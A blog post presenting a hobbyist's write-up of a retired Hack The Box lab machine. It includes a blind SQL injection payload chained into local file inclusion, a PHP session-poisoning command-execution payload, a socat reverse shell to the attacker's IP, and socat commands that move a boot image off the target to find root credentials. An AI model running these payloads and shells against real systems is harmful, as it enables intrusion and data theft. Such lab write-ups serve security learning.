---
layout: post
title:  "Bastion writeup by godzillabg"
---

![Image](/assets/unattended/img0.png)

Hello guys, i’m Friscas from the team chmod755 and this is my first write-up.
Today i’m going to release this writeup of the retired Unattended machine!

# Enumeration
As usual we start with mapping the network using the wonderful tool Nmap  
![Image](/assets/unattended/img1.png)

And we get 2 open ports: port 80 and port 443! As you can see we even have a domain name for the “https://” port. Let’s add it to /etc/hosts  
![Image](/assets/unattended/img2.png)

Now that we have added the domain name in our host database, we can open the website in our browser and start checking for a vuln.

So when we open the website we get the default Apache index  

![Image](/assets/unattended/img3.png)

So what if we try to search “/index.php” ?

![Image](/assets/unattended/img4.png)

We found something; now it is time to check the source code to see what we got

![Image](/assets/unattended/img5.png)

So  we can see we have parameters in “index.php”, “id” is the parameter. We can start with basic tests such as SQLi.. Appending “%27” to the end of  the URl is a good way to test for any problems
![Image](/assets/unattended/img6.png)  
`Before the %27`
![Image](/assets/unattended/img7.png)  
`After adding the %27`

We  can see that the website response is different. I think we are in the  right path. Now it is time to check which type of SQLi we have here.

Since  we have no errors, this means that this is not an error-based SQLi (the  classic one), but we can test for Blind SQLi, by using the boolean  method (thanks to George Boole,  for this amazing function). So now we gonna check the boolean variable  by getting the response of the website,TRUE and FALSE! How can we get  this? Simple; using the logical “and” operator: “index.php?id=587' and 1  = 1 — -”.. here’s the website’s response

![Image](/assets/unattended/img8.png)


The page is the same as when we go to” index.php?id=587" without the “%27",  but when we go to “index.php?id=587' and 1 = 2 — -”, we get

![Image](/assets/unattended/img9.png)

Since 1 is not 2, then the response is false! Blind SQLi confirmed.

We can fireup sqlmap now but we don’t get anything useful as credentials but we will find a table called “filepath” that contain the php files  that are included inside the index.php, so we can test manually! Maybe  we can read files and even execute them :D

We can use this amazing sql query: `UNION (SELECT ‘contact\’ UNION (SELECT \’/path/here\’ FROM filepath) — ‘) — +`

N.B  I have spent a lot of time trying and trying with load_file() and it  didn’t work so i want to thank the discord user: roughplay#1808 (TW: dastan9408) for helping me with that query!

ok now we test to get /etc/passwd but first we intercept the request using burpsuite and send it to Repeater!

![Image](/assets/unattended/img10.png)  
```This is the request with the parameter value url encoded: https://www.nestedflanders.htb/index.php?id=587' UNION (SELECT ‘contact/’ UNION (SELECT /’/etc/passwd/’ FROM filepath) — ‘) —```

So  as you can see we got the /etc/passwd! We got an LFI via SQLi :D how  amazing! But we can chain vulns and get RCE via LFI by log poisoning!  Exciting right? So LFI to RCE via SQLi!

Here you can find everything you need about log poisoning!

So we got as COOKIE a PHPSESSID! If you read the github repo we can see there is a LFI to RCE via PHP sessions!

Let’s give it a try!

![Image](/assets/unattended/img11.png)  
```https://www.nestedflanders.htb/index.php?id=587' UNION (SELECT ‘contact/’ UNION (SELECT /’/var/lib/php/sessions/sess_COOKIE’ FROM filepath) — ‘) —```

So now i created a new cookie with our RCE payload `<?php  system(“whoami”)?>` (url encoded)! and We get www-data, so we are  www-data! now it’s time for a reverse shell, we can use socat, and we  gonna listen to port 80!
```
Listener: socat file:`tty`,raw,echo=0 tcp-listen:80
Launch: exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:80
```

And we get the shell :D

![Image](/assets/unattended/img12.png)


Mmmm we are www-data, we can’t get the user flag because we don’t have the  privileges! It’s time to do some privesc. “ls” returns index.php, maybe  we can find credentials in there :D

![Image](/assets/unattended/img13.png)


and we get some mysql credentials. :D Time to check the mysql databse

![Image](/assets/unattended/img14.png)

the config table seems really interesting, time to check it

![Image](/assets/unattended/img15.png)

there’s some useless credentials but we get what it seems something that get executed

![Image](/assets/unattended/img16.png)

maybe if we change that value with a rev shell it will get executed, let’s try

![Image](/assets/unattended/img17.png)  
and after a little bit we get the shell :D

![Image](/assets/unattended/img18.png)
and we even get the user flag :D

# Privesc
Trying sudo we see it is not installed so we can check id to see our group

![Image](/assets/unattended/img19.png)

oh, weird we are part of the group grub, we can find files where grub have the permission on

![Image](/assets/unattended/img20.png)

Lol, we got initrd.img, and reading this article we can understand that initrd.img is nothing but a compressed file so it’s time to download the file on our machine and decompress it.

For downloading the file on our machine we can use socat again.

Since we are using port 443 for the shell as guly, we can use again port 80 for downloading the file.
```
Receiver: socat -u TCP-LISTEN:80,reuseaddr OPEN:initrd.img-4.9.0-8-amd64,creat 
Sender: socat -u FILE:/boot/initrd.img-4.9.0-8-amd64 TCP:IP:80
```

![Image](/assets/unattended/img21.png)

Now we can check for useful things as credentials: `grep -nr “password”`. and see what we get

![Image](/assets/unattended/img22.png)

mmmm let’s check the:”/scripts/local-top/cryptroot” script and see if we get something useful. :P

Reading the source code we can see this line of code:  
```
if ! crypttarget=”$crypttarget” cryptsource=”$cryptsource” \
 /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then message “cryptsetup failed, bad password or options?””
```  
This command: `/sbin/uinitrd c0m3s3f0ss34nt4n1` will let us get the root password! Let’s try this :D
![Image](/assets/unattended/img23.png)
__Since im not VIP my friend send me the screenshot that’s why is different xD__

And let’s gooooo! we are now root and we can get the flag :P

__Hoped you all enjoyed my writeup__

__Ciao :D__

